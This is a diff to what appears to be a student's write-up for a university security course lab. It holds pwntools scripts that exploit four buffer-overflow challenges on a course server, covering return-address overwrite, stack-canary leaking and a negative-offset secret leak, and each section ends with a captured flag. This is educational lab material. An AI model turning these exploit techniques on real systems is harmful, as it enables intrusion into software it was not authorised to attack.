@@ -18,22 +18,20 @@ The idea is to overwrite the `locals.buffer` and assign another value to the `lo
 ### Code
 ```py
 import pwn
-import time
 
 target = 'oblig1.bufferoverflow.no'
 port = 7001
 
 payload = b"A" * 16 + pwn.p64(0xc0ffee)
 
-p = pwn.remote(target, port)
+remote = pwn.remote(target, port)
 
-p.sendline(payload)
+print(remote.recvline())
 
-print(p.recvline())
-print(p.recvline())
+remote.sendline(payload)
 
-p.interactive()
-p.close()
+print(remote.recvall())
+remote.close()
 ```
 
 ### Secret
@@ -58,16 +56,14 @@ port = 7002
 
 payload = b'A' * 32 + pwn.p64(0x4011a6)
 
-p = pwn.remote(target, port)
+remote = pwn.remote(target, port)
 
-print(p.recvline())
+print(remote.recvline())
 
-p.sendline(payload)
+remote.sendline(payload)
 
-print(p.recvline())
-
-p.interactive()
-p.close()
+print(remote.recvall())
+remote.close()
 ```
 ### Secret
 **{inf226_2024_13t5_f14ming0!}**
@@ -104,28 +100,28 @@ import pwn
 target = 'oblig1.bufferoverflow.no'
 port = '7003'
 
-buffer_to_canary_dst = b'24'
-bufferfill = b'A' * int(buffer_to_canary_dst)
-return_p_offset = b'B' * 8 * 1
+buffer_to_canary_offset = b'24'
+bufferfill = b'A' * int(buffer_to_canary_offset)
+canary_to_return_p_offset = b'B' * 8 * 1
 expose_flag_adr = pwn.p64(0x4011a7)
 
-p = pwn.remote(target, port)
+remote = pwn.remote(target, port)
 
-print(p.recvline())
-p.sendline(buffer_to_canary_dst)
+print(remote.recvline())
+remote.sendline(buffer_to_canary_offset)
 
-print(p.recvline())
-read_canary = p.recvline()
-print(b'Canary: ' + read_canary)
+print(remote.recvline())
+read_canary = remote.recvline()
+print(read_canary)
 
 canary_val = pwn.p64(int(read_canary, 16))
 
-payload = bufferfill + canary_val + return_p_offset + expose_flag_adr
+payload = bufferfill + canary_val + canary_to_return_p_offset + expose_flag_adr
 
-p.sendline(payload)
+remote.sendline(payload)
 
-p.interactive()
-p.close()
+print(remote.recvall())
+remote.close()
 ```
 ### Secret
 **{inf226_2024_1nd14n4_j0n35_w0uld_b3_pr0ud}**
@@ -149,28 +145,26 @@ port = '7004'
 bufferfill = b'A' * 16
 buffer_to_secret_dst = b'-48'
 
-p = pwn.remote(target, port)
+remote = pwn.remote(target, port)
 
-print(p.recvline())
-print(p.recvline())
+print(remote.recvline())
+print(remote.recvline())
 
-p.sendline(buffer_to_secret_dst)
+remote.sendline(buffer_to_secret_dst)
 
-print(p.recvline())
+print(remote.recvline())
 
-read_secret = p.recvline()
-print(b'Secret: ' + read_secret)
+read_secret = remote.recvline()
+print(read_secret)
 
 secret_val = pwn.p64(int(read_secret, 16))
 
-print(p.recvline())
+print(remote.recvline())
 
-p.sendline(bufferfill + secret_val)
+remote.sendline(bufferfill + secret_val)
 
-print(p.recvline())
-
-p.interactive()
-p.close()
+print(remote.recvall())
+remote.close()
 ```
 ### Secret
 **{inf226_2024_n0_gu35t_5h0ld_kn0w}**
